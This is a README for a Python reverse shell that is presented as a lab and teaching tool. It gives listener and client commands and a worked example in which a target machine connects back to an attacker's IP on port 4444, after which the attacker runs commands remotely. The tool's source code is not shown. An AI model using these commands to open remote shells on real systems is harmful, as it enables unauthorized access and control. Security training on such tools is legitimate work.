# Reverse Shell Lab Tool

⚠️ **LAB USE ONLY** - This tool is designed for isolated lab environments and educational purposes. DO NOT deploy outside your lab or expose to the internet.

## Overview

A minimal reverse shell implementation for educational purposes. Demonstrates how reverse shells work in a controlled lab environment. Includes both listener (attacker) and client (target) components.

## Features

- **Listener Mode**: Set up a reverse shell listener
- **Client Mode**: Connect back to listener
- **Interactive Shell**: Execute commands remotely
- **Lab-Safe**: Designed for isolated lab environments only
- **Educational**: Learn about reverse shell techniques

## Installation

### Requirements

- Python 3.8+
- Standard library only (no external dependencies!)

### Setup

```bash
# Clone the repository
git clone https://github.com/5h4d0wn1k/lab-reverse-shell.git
cd lab-reverse-shell

# No installation needed!
python lab_shell.py --help
```

## Usage

### Listener Mode (Attacker Box)

```bash
# Start listener on attacker machine
python lab_shell.py listen --host 0.0.0.0 --port 4444
```

### Client Mode (Target Box)

```bash
# Connect from target machine
python lab_shell.py connect --host <attacker-ip> --port 4444
```

## Command-Line Options

### Listener Mode

| Option | Description |
|--------|-------------|
| `listen` | Start listener mode |
| `--host` | Listen address (default: 0.0.0.0) |
| `--port` | Listen port (default: 4444) |

### Client Mode

| Option | Description |
|--------|-------------|
| `connect` | Start client mode |
| `--host` | Attacker IP address (required) |
| `--port` | Attacker port (default: 4444) |

## Usage Example

### Step 1: Start Listener

On attacker machine (192.168.1.100):
```bash
python lab_shell.py listen --host 0.0.0.0 --port 4444
```

Output:
```
⚠️  Lab-only reverse shell listener. Do not expose to the internet.
[+] Connection from ('192.168.1.50', 54321)
shell>
```

### Step 2: Connect Client

On target machine (192.168.1.50):
```bash
python lab_shell.py connect --host 192.168.1.100 --port 4444
```

### Step 3: Execute Commands

On listener, you can now execute commands:
```bash
shell> whoami
user

shell> pwd
/home/user

shell> ls -la
total 24
drwxr-xr-x 2 user user 4096 Jan 1 12:00 .
...

shell> exit
```

## Security Implications

This tool demonstrates:
- **Reverse Shells**: How attackers establish remote access
- **Command Execution**: Remote command execution techniques
- **Network Communication**: TCP-based command and control
- **Detection**: Importance of monitoring network connections

## Lab Setup Requirements

- **Isolated Network**: Use isolated lab network only
- **No Internet Access**: Do not expose to internet
- **Controlled Environment**: Only use in controlled lab environments
- **Authorization**: Only use with explicit authorization

## Use Cases

- **Security Training**: Learn about reverse shell techniques
- **Lab Exercises**: Practice in isolated lab environments
- **Educational Purposes**: Understand reverse shell attack vectors
- **Detection Testing**: Test detection mechanisms

## Legal Disclaimer

⚠️ **CRITICAL**: This tool is for LAB USE ONLY in isolated environments.

- **NEVER** deploy outside your lab
- **NEVER** expose to the internet
- **NEVER** use on systems you don't own or have permission to test
- **ONLY** use in isolated lab environments
- Unauthorized remote access is illegal

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## License

This project is for educational purposes only. Use responsibly and ethically.

---

**CRITICAL**: LAB USE ONLY - Never deploy outside your lab or expose to the internet!
